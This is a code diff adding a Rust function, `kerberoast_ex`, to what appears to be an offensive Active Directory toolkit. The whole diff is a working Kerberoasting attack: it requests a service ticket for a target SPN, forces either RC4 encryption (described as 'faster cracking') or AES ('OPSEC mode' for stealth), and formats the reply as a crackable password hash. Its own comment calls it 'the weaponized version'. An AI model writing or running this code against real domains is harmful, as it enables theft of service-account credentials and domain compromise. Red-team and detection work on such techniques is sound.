@@ -1161,6 +1161,93 @@ pub async fn kerberoast_fast(
     })
 }
 
+/// Kerberoast with etype filtering (aes_only / downgrade_to_rc4).
+///
+/// When `aes_only=true`: only AES256/AES128 etypes are requested (OPSEC mode).
+/// When `aes_only=false`: only RC4_HMAC (etype 23) is requested (faster cracking).
+///
+/// This is the weaponized version of `kerberoast()` for scenarios where you
+/// want to control which encryption type the KDC uses for the service ticket.
+pub async fn kerberoast_ex(
+    dc_ip: &str,
+    tgt: &TicketGrantingData,
+    target_spn: &str,
+    aes_only: bool,
+) -> Result<CrackableHash> {
+    let etypes: &[i32] = if aes_only {
+        &[ETYPE_AES256_CTS, ETYPE_AES128_CTS]
+    } else {
+        &[ETYPE_RC4_HMAC]
+    };
+
+    info!("Kerberoasting SPN: {target_spn} (etypes: {etypes:?})");
+    let realm = &tgt.client_realm;
+
+    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
+    let sname = PrincipalName {
+        name_type: NT_SRV_INST,
+        name_string: spn_parts.iter().map(|s| s.to_string()).collect(),
+    };
+
+    let encrypted_auth = build_encrypted_authenticator(
+        realm,
+        &tgt.client_principal,
+        &tgt.session_key,
+        tgt.session_key_etype,
+    )?;
+    let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);
+
+    let pa_tgs = PaData {
+        padata_type: PA_TGS_REQ,
+        padata_value: ap_req.build(),
+    };
+
+    let req_body = build_tgs_req_body(
+        realm,
+        sname,
+        etypes,
+        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
+        None,
+        None,
+    );
+
+    let tgs_req = TgsReq {
+        pvno: 5,
+        msg_type: 12,
+        padata: Some(vec![pa_tgs]),
+        req_body,
+    };
+
+    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
+
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
+
+    let enc_part = &tgs_rep.ticket.enc_part;
+    let cipher = &enc_part.cipher;
+
+    let hash_string = format_tgs_hash_string(
+        enc_part.etype,
+        &tgt.client_principal,
+        realm,
+        target_spn,
+        cipher,
+    );
+
+    info!(
+        "Kerberoast hash for {target_spn} (etype: {})",
+        enc_part.etype
+    );
+    Ok(CrackableHash {
+        username: tgt.client_principal.clone(),
+        domain: realm.to_string(),
+        spn: Some(target_spn.to_string()),
+        hash_type: HashType::Kerberoast,
+        etype: enc_part.etype,
+        hash_string,
+    })
+}
+
 /// Request a service ticket (TGS) for an arbitrary SPN and return
 /// the decrypted ticket + session key as TicketGrantingData.
 /// This is the generic "give me a usable service ticket" function,
